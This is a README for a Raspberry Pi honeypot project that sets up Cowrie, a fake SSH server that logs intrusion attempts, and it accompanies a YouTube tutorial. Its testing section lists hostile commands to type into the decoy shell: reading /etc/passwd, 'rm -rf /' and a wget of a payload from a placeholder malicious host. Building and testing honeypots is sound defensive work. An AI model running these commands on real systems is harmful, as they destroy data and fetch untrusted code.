# Pi-HoneyPot-Server 🍯
A Raspberry Pi honeypot server project using Cowrie to simulate a vulnerable SSH server and log intrusion attempts in real-time.

## 🔒 What Is This?
This project sets up [Cowrie](https://github.com/cowrie/cowrie) — a popular honeypot — on a Raspberry Pi to capture unauthorized login attempts, record attacker behavior, and simulate a realistic Linux environment.

## 📦 Features
- Fake SSH terminal on port 2222
- Logs login attempts and typed commands
- Perfect for educational or monitoring purposes
- Can be expanded into a full honeynet

## 🧰 Setup Instructions

1. **Update and install dependencies:**
```bash
sudo apt update
sudo apt install git python3-venv libssl-dev libffi-dev build-essential \
python3-dev libpython3-dev libbz2-dev libsqlite3-dev libreadline-dev \
libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev -y
```

2. **Clone Cowrie and enter the directory:**
```bash
git clone https://github.com/cowrie/cowrie.git
cd cowrie
```

3. **Create and activate virtual environment:**
```bash
python3 -m venv cowrie-env
source cowrie-env/bin/activate
```

4. **Install Python requirements:**
```bash
pip install --upgrade pip
pip install -r requirements.txt
```

5. **Copy configuration file:**
```bash
cp etc/cowrie.cfg.dist etc/cowrie.cfg
```

6. **Start the honeypot:**
```bash
bin/cowrie start
```

## 🧪 Test It

```bash
ssh root@<your_pi_ip> -p 2222
```

Then try commands like:
```bash
ls
cat /etc/passwd
rm -rf /
wget http://malicious.site/payload.sh
```

Check logs with:
```bash
tail -f var/log/cowrie/cowrie.log
```

## 📁 Files Included

- `commands.txt`: Terminal commands used in setup
- `Cowrie_Honeypot_YouTube_Script.txt`: Script used for the CodewithRomi YouTube video
- `thumbnail.png`: Video thumbnail (YouTube ready)

## 📺 Watch the Video Tutorial

🔗 [YouTube Tutorial](https://youtube.com/@CodewithRomi)

## 📜 License
MIT License — for educational use only.

---

Made with ❤️ by [CodewithRomi](https://github.com/theeromi)
